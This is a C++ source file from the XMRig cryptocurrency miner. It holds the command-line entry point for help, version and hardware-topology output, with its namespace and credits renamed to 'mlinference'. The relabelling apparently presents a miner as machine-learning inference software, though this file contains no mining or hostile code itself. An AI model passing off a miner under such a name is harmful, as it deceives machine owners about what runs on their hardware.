/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
 * Copyright 2018-2019 SChernykh   <https://github.com/SChernykh>
 * Copyright 2016-2019 XMRig       <https://github.com/mlinference>, <support@mlinference.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <cstdio>
#include <uv.h>

#ifdef XMRIG_FEATURE_TLS
#   include <openssl/opensslv.h>
#endif

#ifdef XMRIG_FEATURE_HWLOC
#   include <hwloc.h>
#endif

#ifdef XMRIG_FEATURE_OPENCL
#   include "backend/opencl/wrappers/OclLib.h"
#   include "backend/opencl/wrappers/OclPlatform.h"
#endif

#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include "core/config/usage.h"
#include "version.h"

namespace mlinference {

#ifdef XMRIG_FEATURE_HWLOC
// Abstraction layer for hwloc
class HwlocWrapper {
public:
    HwlocWrapper() : topology(nullptr) {
        hwloc_topology_init(&topology);
        hwloc_topology_load(topology);
    }

    ~HwlocWrapper() {
        hwloc_topology_destroy(topology);
    }

    bool exportTopologyToFile(const std::string &path) {
#   if HWLOC_API_VERSION >= 0x20000
        return hwloc_topology_export_xml(topology, path.c_str(), 0) != -1;
#   else
        return hwloc_topology_export_xml(topology, path.c_str()) != -1;
#   endif
    }

    const char* getVersion() const {
#   if defined(HWLOC_VERSION)
        return HWLOC_VERSION;
#   elif HWLOC_API_VERSION >= 0x20000
        return "2.x";
#   else
        return "1.x";
#   endif
    }

private:
    hwloc_topology_t topology;
};
#endif


static int showVersion()
{
    printf(APP_NAME " " APP_VERSION "\n built on " __DATE__

#   if defined(__clang__)
    " with clang " __clang_version__);
#   elif defined(__GNUC__)
    " with GCC");
    printf(" %d.%d.%d", __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);
#   elif defined(_MSC_VER)
    " with MSVC");
    printf(" %d", MSVC_VERSION);
#   else
    );
#   endif

    printf("\n features:"
#   if defined(__i386__) || defined(_M_IX86)
    " 32-bit"
#   elif defined(__x86_64__) || defined(_M_AMD64)
    " 64-bit"
#   endif

#   if defined(__AES__) || defined(_MSC_VER)
    " AES"
#   endif
    "\n");

    printf("\nlibuv/%s\n", uv_version_string());

#   if defined(XMRIG_FEATURE_TLS)
    {
#       if defined(LIBRESSL_VERSION_TEXT)
        printf("LibreSSL/%s\n", LIBRESSL_VERSION_TEXT + 9);
#       elif defined(OPENSSL_VERSION_TEXT)
        constexpr const char *v = &OPENSSL_VERSION_TEXT[8];
        printf("OpenSSL/%.*s\n", static_cast<int>(strchr(v, ' ') - v), v);
#       endif
    }
#   endif

#   if defined(XMRIG_FEATURE_HWLOC)
    HwlocWrapper hwloc;
    printf("hwloc/%s\n", hwloc.getVersion());
#   endif

    return 0;
}


#ifdef XMRIG_FEATURE_HWLOC
static int exportTopology(const Process &)
{
    const String path = Process::location(Process::ExeLocation, "topology.xml");

    HwlocWrapper hwloc;
    if (!hwloc.exportTopologyToFile(std::string(path.data()))) {
        printf("failed to export hwloc topology.\n");
    }
    else {
        printf("hwloc topology successfully exported to \"%s\"\n", path.data());
    }

    return 0;
}
#endif


} // namespace mlinference


mlinference::Entry::Id mlinference::Entry::get(const Process &process)
{
    const Arguments &args = process.arguments();
    if (args.hasArg("-h") || args.hasArg("--help")) {
         return Usage;
    }

    if (args.hasArg("-V") || args.hasArg("--version") || args.hasArg("--versions")) {
         return Version;
    }

#   ifdef XMRIG_FEATURE_HWLOC
    if (args.hasArg("--export-topology")) {
        return Topo;
    }
#   endif

#   ifdef XMRIG_FEATURE_OPENCL
    if (args.hasArg("--print-platforms")) {
        return Platforms;
    }
#   endif

    return Default;
}


int mlinference::Entry::exec(const Process &process, Id id)
{
    switch (id) {
    case Usage:
        printf("%s\n", usage().c_str());
        return 0;

    case Version:
        return showVersion();

#   ifdef XMRIG_FEATURE_HWLOC
    case Topo:
        return exportTopology(process);
#   endif

#   ifdef XMRIG_FEATURE_OPENCL
    case Platforms:
        if (OclLib::init()) {
            OclPlatform::print();
        }
        return 0;
#   endif

    default:
        break;
    }

    return 1;
}
